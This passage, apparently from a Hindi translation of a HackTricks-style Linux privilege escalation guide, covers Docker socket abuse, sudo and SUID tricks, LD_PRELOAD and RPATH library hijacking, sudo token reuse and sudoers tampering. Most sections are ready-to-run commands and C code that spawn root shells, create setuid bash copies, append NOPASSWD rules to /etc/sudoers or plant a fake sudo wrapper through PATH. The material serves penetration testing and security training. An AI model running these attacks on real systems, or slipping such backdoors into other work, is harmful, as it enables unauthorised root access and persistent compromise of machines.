ध्यान दें कि कुछ **sockets listening for HTTP** requests मौजूद हो सकते हैं (_मैं .socket files की बात नहीं कर रहा बल्कि उन फाइलों की जो unix sockets के रूप में काम कर रही हैं_). आप इसे निम्न से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद **exploit some vulnerability** भी कर सकें।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित किया जाना चाहिए। डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों द्वारा writable है। इस socket पर write access होने से privilege escalation हो सकता है। नीचे बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक तरीके अगर Docker CLI उपलब्ध नहीं है।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्न commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको host के फ़ाइल सिस्टम पर root-level access के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API को सीधे उपयोग करना**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके हेरफेर किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host सिस्टम की root directory को mount करने वाला एक container बनाने के लिए request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए container को शुरू करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से कनेक्शन स्थापित करें, जिससे उसमें command execution संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`l` `socat` कनेक्शन सेट करने के बाद, आप host के filesystem पर root-level access के साथ सीधे container में commands चला सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** में हैं, तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप देखते हैं कि आप **`ctr`** command का उपयोग कर सकते हैं, तो निम्न पृष्ठ पढ़ें क्योंकि **आप इसे abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप देखते हैं कि आप **`runc`** command का उपयोग कर सकते हैं, तो निम्न पृष्ठ पढ़ें क्योंकि **आप इसे abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) system है जो applications को प्रभावी ढंग से interact और डेटा साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह विभिन्न प्रकार के application communication के लिए एक मजबूत framework प्रदान करता है।

यह सिस्टम लचीला है, और basic IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा विनिमय को बढ़ाता है, यह enhanced UNIX domain sockets की याद दिलाता है। इसके अलावा, यह घटनाओं या सिग्नलों के प्रसारण में मदद करता है, जिससे सिस्टम घटकों के बीच सहज एकीकरण होता है। उदाहरण के लिए, किसी Bluetooth daemon से आने वाले कॉल के बारे में एक सिग्नल एक music player को mute करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो सेवाओं के अनुरोध और विधि कॉल को सरल बनाता है, उन प्रक्रियाओं को सुव्यवस्थित करते हुए जो पारंपरिक रूप से जटिल होती थीं।

D-Bus एक **allow/deny model** पर काम करता है, जो संदेश अनुमति (method calls, signal emissions, इत्यादि) का प्रबंधन matching policy rules के cumulative प्रभाव के आधार पर करता है। ये नीतियाँ bus के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन अनुमतियों के शोषण के माध्यम से privilege escalation की अनुमति दे सकती हैं।

ऐसी एक नीति का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जिसमें root user के लिए `fi.w1.wpa_supplicant1` को own करने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की permissions का विवरण है।

जिन नीतियों में user या group निर्दिष्ट नहीं हैं वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context नीतियाँ उन सभी पर लागू होती हैं जिन्हें अन्य विशिष्ट नीतियाँ कवर नहीं करतीं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ सीखें कि D-Bus communication को कैसे enumerate और exploit किया जाए:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति पता लगाना हमेशा दिलचस्प रहता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट

हमेशा उन network services की जाँच करें जो मशीन पर चल रही हों और जिनके साथ आप उसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जांचें कि क्या आप traffic को sniff कर सकते हैं। अगर आप कर सकते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### Generic Enumeration

जाँचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux वर्शन एक बग से प्रभावित थे जो UID > INT_MAX वाले उपयोगकर्ताओं को privileges escalate करने की अनुमति देता है. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसे एक्सप्लॉइट करने के लिए इस्तेमाल करें:** **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप **किसी समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड के अंदर कुछ भी रोचक है या नहीं (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

यदि आप **पर्यावरण का कोई पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें**।

### Su Brute

यदि आपको बहुत शोर करने की परवाह नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर ब्रूट-फोर्स करने का प्रयास कर सकते हैं.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं पर ब्रूट-फोर्स करने की कोशिश करता है।

## Writable PATH abuses

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फ़ोल्डर के अंदर लिख सकते हैं** तो आप **writable फ़ोल्डर के अंदर एक backdoor बनाकर** विशेषाधिकार बढ़ा सकते हैं, जिसका नाम किसी ऐसे कमांड जैसा होगा जिसे किसी अलग उपयोगकर्ता (आदर्श रूप से root) द्वारा चलाया जाएगा और जो आपके writable फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से **लोड नहीं होता**।

### SUDO and SUID

आपको कुछ कमांड `sudo` का उपयोग करके चलाने की अनुमति दी जा सकती है या उन पर `suid` bit लगा हो सकता है। इसे जाँचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि कोई कमांड निष्पादित करने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी कमांड को दूसरे उपयोगकर्ता की अनुमतियों के साथ चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `vim` को `root` के रूप में चला सकता है, अब `root` निर्देशिका में एक ssh key जोड़कर या `sh` कॉल करके शेल प्राप्त करना सरल है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को कुछ निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, स्क्रिप्ट को root के रूप में चलाते समय मनमानी python लाइब्रेरी लोड करने के लिए **PYTHONPATH hijacking** के प्रति **असुरक्षित** था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep के माध्यम से संरक्षित → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash’s non-interactive startup behavior का उपयोग करके किसी अनुमत कमांड को invoke करते समय arbitrary code को root के रूप में चला सकते हैं।

- Why it works: non-interactive shells के लिए, Bash `$BASH_ENV` को evaluate करता है और target script चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम किसी script या shell wrapper को चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root privileges के साथ source की जाती है।

- Requirements:
- एक sudo नियम जिसे आप चला सकें (कोई भी target जो non-interactively `/bin/bash` को invoke करे, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जांचने के लिए `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- `BASH_ENV` (and `ENV`) को `env_keep` से हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars का उपयोग किया जाए तो sudo I/O logging और alerting पर विचार करें।

### Sudo निष्पादन बाइपास करने वाले पथ

**Jump** अन्य फाइलें पढ़ने के लिए या **symlinks** का उपयोग करने के लिए। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** उपयोग किया गया है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path

यदि किसी एक command को **sudo permission** path निर्दिष्ट किए बिना दिया गया है: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसका exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक उन मामलों में भी उपयोग की जा सकती है जब एक **suid** बाइनरी **किसी अन्य कमांड को बिना path बताए execute करती है (हमेशा _**strings**_ के साथ किसी अजीब SUID बाइनरी की सामग्री की जाँच करें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID बाइनरी जिसमें कमांड का path हो

यदि **suid** बाइनरी **path निर्दिष्ट करते हुए किसी अन्य कमांड को execute करती है**, तो, आप उस कमांड के नाम से **export a function** करने की कोशिश कर सकते हैं जिसे suid file कॉल कर रही है।

उदाहरण के लिए, यदि कोई suid बाइनरी _**/usr/sbin/service apache2 start**_ को कॉल करती है, तो आपको उस function को बनाकर और export करके कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary कॉल करते हैं, यह फ़ंक्शन निष्पादित किया जाएगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को निर्दिष्ट करने के लिए किया जाता है जिन्हें loader द्वारा बाकी सभी से पहले लोड किया जाए, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को लाइब्रेरी प्रीलोडिंग कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस फीचर के दुरुपयोग को रोकने के लिए, खासकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- लोडर उन executables के लिए **LD_PRELOAD** की अनदेखी कर देता है जहाँ real user ID (_ruid_) और effective user ID (_euid_) मेल नहीं खाते।
- **suid/sgid** वाले executables के लिए, केवल उन standard paths में मौजूद libraries जिन्हें भी suid/sgid हो, प्रीलोड किया जाता है।

Privilege escalation हो सकता है अगर आपके पास `sudo` के साथ commands execute करने की क्षमता है और `sudo -l` के आउटपुट में कथन **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन `sudo` के साथ commands चलाते समय भी **LD_PRELOAD** environment variable को बनाए रखने और मान्यता देने की अनुमति देता है, जो संभावित रूप से elevated privileges के साथ arbitrary code के निष्पादन का कारण बन सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
के रूप में सहेजें **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc दुरुपयोग किया जा सकता है यदि attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

यदि आपको कोई ऐसी बाइनरी मिलती है जिसके पास **SUID** permissions हैं और जो असामान्य दिखाई देती है, तो यह अच्छी प्रैक्टिस है कि यह सत्यापित करें कि यह सही तरीके से **.so** फ़ाइलें लोड कर रही है या नहीं। इसे निम्नलिखित कमांड चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर यह संभावित शोषण का संकेत देती है।

इसे शोषित करने के लिए, एक C फ़ाइल बनाकर, मान लें _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compiled और executed होने पर, file permissions को बदलकर और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का प्रयास करता है।

उपरोक्त C file को shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित सिस्टम समझौता संभव हो सके।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक ऐसा SUID binary पाया है जो उस फ़ोल्डर से library लोड कर रहा है जहाँ हम लिख सकते हैं, तो आइए उसी फ़ोल्डर में आवश्यक नाम के साथ library बनाएँ:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको ऐसी त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है जिसे attacker स्थानीय security restrictions को bypass करने के लिए exploit कर सकते हैं। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप **only inject arguments** कर सकते हैं किसी command में।

The project Unix binaries के वैध फ़ंक्शन्स को संकलित करता है जिन्हें restricted shells से बाहर निकलने, privileges escalate या बनाए रखने, files transfer करने, bind और reverse shells spawn करने और अन्य post-exploitation tasks में abuse किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) _/tmp_ में बाइनरी `activate_sudo_token` बनाएगा। आप इसे अपने session में **sudo token को activate** करने के लिए इस्तेमाल कर सकते हैं (आपको automatically एक root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व और setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **third exploit** (`exploit_v3.sh`) **sudoers file** बनाएगा जो **sudo tokens** को अनंत कर देता है और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देता है
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर या फ़ोल्डर के अंदर बनाए गए किसी भी फाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं।\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और उस user के रूप में आपका shell PID 1234 है, तो आप बिना password जाने **obtain sudo privileges** कर सकते हैं, जैसा कि नीचे दिखाया गया है:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` फ़ाइल और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**।\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ रोचक जानकारी प्राप्त कर** सकेंगे, और यदि आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** कर सकेंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas` — इसकी कॉन्फ़िगरेशन `/etc/doas.conf` पर जाँचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user आमतौर पर किसी machine से connect करता है और `sudo` का उपयोग करके privileges escalate करता है** और आपके पास उसी user context में एक shell है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपका कोड root के रूप में चलाएगा और फिर user का command चलाएगा। फिर, user context का **$PATH बदलें** (उदाहरण के लिए नया path .bash_profile में जोड़कर) ताकि जब user `sudo` चलाए, तो आपका sudo executable चलाया जाए।

ध्यान दें कि अगर user कोई अलग shell (bash नहीं) उपयोग करता है तो नया path जोड़ने के लिए आपको अन्य फ़ाइलें संशोधित करनी पड़ेंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है **कि लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से आ रही हैं**। आम तौर पर, यह फ़ाइल निम्न पथ रखती है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डरों की ओर संकेत करती हैं** जहाँ **लाइब्रेरियाँ** **खोजी जाएँगी**। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरियों की खोज करेगा**।

यदि किसी कारण से **किसी उपयोगकर्ता के पास लिखने की अनुमतियाँ** उन किसी भी पथ पर हैं: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` में कॉन्फ़िग फ़ाइल द्वारा संकेत किए गए किसी भी फ़ोल्डर पर, तो वह अधिकार वृद्धि करने में सक्षम हो सकता है।\
नीचे दिए पृष्ठ में देखें कि **इस गलत कॉन्फ़िगरेशन का शोषण कैसे किया जा सकता है**:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करके, यह प्रोग्राम द्वारा उसी स्थान पर उपयोग किया जाएगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करके एक दुष्ट लाइब्रेरी बनाएं
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी प्रक्रिया को उपलब्ध **root privileges का एक उपसमूह प्रदान करते हैं**। यह प्रभावी रूप से root **privileges को छोटे और अलग-अलग इकाइयों में बाँट देता है**। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह privileges का पूरा सेट कम हो जाता है, जिससे exploitation के जोखिम घट जाते हैं।\
अधिक जानकारी और capabilities तथा उनके दुरुपयोग के तरीके जानने के लिए निम्न पृष्ठ पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

एक डायरेक्टरी में, **"execute" बिट** का मतलब है कि प्रभावित user फोल्डर में "**cd**" कर सकता है।\
**"read"** बिट का मतलब है कि user **files** को **list** कर सकता है, और **"write"** बिट का मतलब है कि user नई **files** बना और **delete** कर सकता है।

## ACLs

